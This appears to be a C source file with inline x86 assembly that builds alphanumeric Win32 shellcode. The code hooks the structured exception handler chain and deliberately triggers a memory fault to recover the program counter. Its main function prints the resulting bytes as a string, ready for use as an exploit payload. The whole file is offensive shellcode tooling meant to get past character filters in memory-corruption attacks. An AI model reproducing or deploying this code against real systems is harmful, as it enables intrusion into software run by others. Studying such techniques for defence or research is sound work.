void OriginalSEH(void) {
  __asm__("
  # SEH: 0x59 | 0x5c 0x59 0x59 0x59 | 0x59 0x41 0x41 0x51 | 0xc3
	  pop	    %ecx				# < eax = some return address
	  pop     %esp				# < esp -> SEH info struct
	  pop	    %ecx				# dunno
	  pop	    %ecx				# dunno
	  pop	    %ecx				# dunno
	  pop	    %ecx				# ecx = exception address
	  inc     %ecx
	  inc     %ecx
	  push    %ecx				# > baseaddress
	  ret

	  .byte 0x0
  ");
}

void Win32SEHGetPC(void) {
  __asm__("
    push    %esi
    push    %esp
    pop     %eax
    xor     %ss:(%eax), %esi    # %esi = 0
    push    %esi
    pop     %eax                # %eax = 0

  #// Push SEH code onto the stack
  #// push the ret (0xc3) first
    dec     %eax                # %al = 0xff
    xor     $0x39, %al          # %al = 0xff^0c39 = 0xc6
    dec     %eax
    dec     %eax
    dec     %eax                # %al = 0xc3
    push    %eax                # 0xc3

  #// now the rest, pop %esp is not alpha numeric so we'll have to do some
  #// fancy stack juggling to get it right.
    push    $0x51414159         # 0x59 0x41 0x41 0x51 | 0xc3
    push    $0x5959595a
    pop     %ecx
    inc     %ecx
    inc     %ecx
    push    %ecx                # 0x5c 0x59 0x59 0x59 | 0x59 0x41 0x41 ...
    push    %ecx
    inc     %esp
    inc     %esp
    inc     %esp                # 0x59 | 0x5c 0x59 0x59 0x59 | 0x59 0x41 ...

  #// Hook the new SEH
    xor     %fs:(%esi), %esi    # %esi -> SEH chain.
    inc     %esi
    inc     %esi
    inc     %esi
    inc     %esi                # %esi -> old SEH address
    push    %esp
    pop     %eax

    push    %esi                # %eax -> old SEH
    push    $0x30               # %ecx = 0x30
    push    %eax                # %edx
    push    %eax                # %ebx
    push    %esp                # %esp (not used)
    push    %ebp                # %ebp
    push    %eax                # %esi = new SEH
    push    %eax                # %edi
    popa
    xor     (%eax), %esi    # %esi = new^old
    xor     %esi, (%eax)    # SEH address = %esp

  # Cause an exception
    cmp     %bh, (%ecx)        # %ecx -> 0 (Illegal read of memory at 0x30)
    # SEH will set %ecx to point to the location in memory where the exception
    # took place, this will make sure the exception doesn't happen again.

    .byte 0x0
  ");
}

int main (int argc, char** argv) {
  char* strWin32SEHGetPC = (char*)Win32SEHGetPC+3;
  printf("%s", strWin32SEHGetPC);
  return 0;
}
